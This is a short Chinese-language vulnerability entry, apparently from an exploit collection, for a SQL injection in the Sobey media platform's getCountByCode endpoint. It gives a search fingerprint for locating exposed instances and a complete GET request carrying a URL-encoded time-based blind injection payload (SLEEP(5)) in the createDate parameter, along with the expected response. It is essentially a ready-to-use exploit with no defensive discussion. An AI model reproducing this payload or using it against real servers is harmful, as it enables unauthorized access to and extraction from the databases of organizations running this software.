# 索贝融媒体getCountByCode存在SQL注入漏洞

索贝融媒体 ｜ SQL注入 ｜ —
- **指纹**：`body="/Sc-TaskMonitoring/"`
- **请求**：`GET /sobey-mchEditor/count/getCountByCode?status=1&createDate=%27+AND+%28SELECT+3155+FROM+%28SELECT%28SLEEP%285%29%29%29tTYh%29+AND+%27YUCP%27%3D%27YUCP HTTP/1.1`
- **响应特征**：200